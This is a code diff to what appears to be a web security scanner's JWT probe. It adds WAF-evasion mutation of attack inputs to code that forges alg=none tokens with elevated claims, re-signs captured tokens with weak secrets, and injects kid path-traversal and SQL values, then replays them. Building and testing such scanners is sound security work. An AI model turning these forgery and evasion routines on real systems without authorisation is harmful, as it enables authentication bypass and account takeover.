@@ -17,8 +17,7 @@ from shroodler.models import Finding
 from shroodler.pacer import Pacer
 from shroodler.probes.common import body_text, dedupe, request
 from shroodler.urls import origin as origin_of
-
-# TODO: apply shroodler.waf_detect.mutate_payload when state.waf_detected.
+from shroodler.waf_detect import expand_if_waf
 
 _JWT_RE = re.compile(r"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
 _WEAK_SECRETS = ("secret", "password", "changeit", "webgoat", "", "HS256")
@@ -90,8 +89,8 @@ def _b64url_json(obj: dict) -> str:
     return _b64url(json.dumps(obj, separators=(",", ":")).encode("utf-8"))
 
 
-def _forge_alg_none(payload: dict) -> str:
-    header = {"alg": "none", "typ": "JWT"}
+def _forge_alg_none(payload: dict, alg: str = "none") -> str:
+    header = {"alg": alg, "typ": "JWT"}
     return f"{_b64url_json(header)}.{_b64url_json(payload)}."
 
 
@@ -270,6 +269,9 @@ def probe_jwt(
     *,
     client: httpx.Client | None = None,
     pacer: Pacer | None = None,
+    state=None,
+    waf_detected: bool = False,
+    waf_vendor: str | None = None,
 ) -> list[Finding]:
     """Re-sign captured JWTs with weak HS256 secrets and replay them."""
     tokens = _find_jwts(cookie_header, auth_header)
@@ -297,8 +299,17 @@ def probe_jwt(
             pacer=pacer,
         )
         if garbage_status in _DENIED:
-            for secret in _WEAK_SECRETS:
-                forged = _resign(token, secret)
+            secrets_to_try = expand_if_waf(
+                _WEAK_SECRETS,
+                state=state,
+                waf_detected=waf_detected,
+                waf_vendor=waf_vendor,
+            )
+            for secret in secrets_to_try:
+                try:
+                    forged = _resign(token, secret)
+                except Exception:  # noqa: BLE001 - mutated secret must not crash
+                    continue
                 if not forged:
                     continue
                 resp = request(
@@ -331,25 +342,36 @@ def probe_jwt(
             continue
         header, payload = parsed
 
-        none_token = _forge_alg_none(_elevate_payload(payload))
-        none_resp = _replay(
-            url,
-            cookie_header,
-            auth_header,
-            token,
-            none_token,
-            client=client,
-            pacer=pacer,
+        none_algs = expand_if_waf(
+            ("none",),
+            state=state,
+            waf_detected=waf_detected,
+            waf_vendor=waf_vendor,
         )
-        if _access_elevated(original, none_resp):
-            findings.append(
-                _finding(
-                    url,
-                    "jwt-alg-none",
-                    "Server accepted a forged alg=none JWT with elevated claims.",
-                    "alg=none",
-                )
+        for alg in none_algs:
+            try:
+                none_token = _forge_alg_none(_elevate_payload(payload), alg=alg)
+            except Exception:  # noqa: BLE001 - mutated alg must not crash
+                continue
+            none_resp = _replay(
+                url,
+                cookie_header,
+                auth_header,
+                token,
+                none_token,
+                client=client,
+                pacer=pacer,
             )
+            if _access_elevated(original, none_resp):
+                findings.append(
+                    _finding(
+                        url,
+                        "jwt-alg-none",
+                        "Server accepted a forged alg=none JWT with elevated claims.",
+                        f"alg={alg}",
+                    )
+                )
+                break
 
         if str(header.get("alg") or "").upper() == "RS256":
             secret = _fetch_hmac_secret_from_jwks(
@@ -396,34 +418,47 @@ def probe_jwt(
                 (_KID_TRAVERSAL, b""),
                 (_KID_SQL, b"secret"),
             )
+            kid_hit = False
             for kid_value, kid_secret in kid_attempts:
-                try:
-                    forged = _hs256_sign(payload, kid_secret, {"kid": kid_value})
-                except Exception:  # noqa: BLE001
-                    continue
-                resp = _replay(
-                    url,
-                    cookie_header,
-                    auth_header,
-                    token,
-                    forged,
-                    client=client,
-                    pacer=pacer,
+                variants = expand_if_waf(
+                    (kid_value,),
+                    state=state,
+                    waf_detected=waf_detected,
+                    waf_vendor=waf_vendor,
                 )
-                accepted = (
-                    garbage_status in _DENIED and resp is not None and int(resp.status_code) == 200
-                ) or _access_elevated(original, resp)
-                if not accepted:
-                    continue
-                findings.append(
-                    _finding(
+                for mutated_kid in variants:
+                    try:
+                        forged = _hs256_sign(payload, kid_secret, {"kid": mutated_kid})
+                    except Exception:  # noqa: BLE001
+                        continue
+                    resp = _replay(
                         url,
-                        "jwt-kid-injection",
-                        "Server accepted a JWT whose kid was rewritten and "
-                        "re-signed with a derived HMAC secret.",
-                        f"kid={kid_value!r}",
+                        cookie_header,
+                        auth_header,
+                        token,
+                        forged,
+                        client=client,
+                        pacer=pacer,
                     )
-                )
-                break
+                    accepted = (
+                        garbage_status in _DENIED
+                        and resp is not None
+                        and int(resp.status_code) == 200
+                    ) or _access_elevated(original, resp)
+                    if not accepted:
+                        continue
+                    findings.append(
+                        _finding(
+                            url,
+                            "jwt-kid-injection",
+                            "Server accepted a JWT whose kid was rewritten and "
+                            "re-signed with a derived HMAC secret.",
+                            f"kid={mutated_kid!r}",
+                        )
+                    )
+                    kid_hit = True
+                    break
+                if kid_hit:
+                    break
 
     return dedupe(findings)
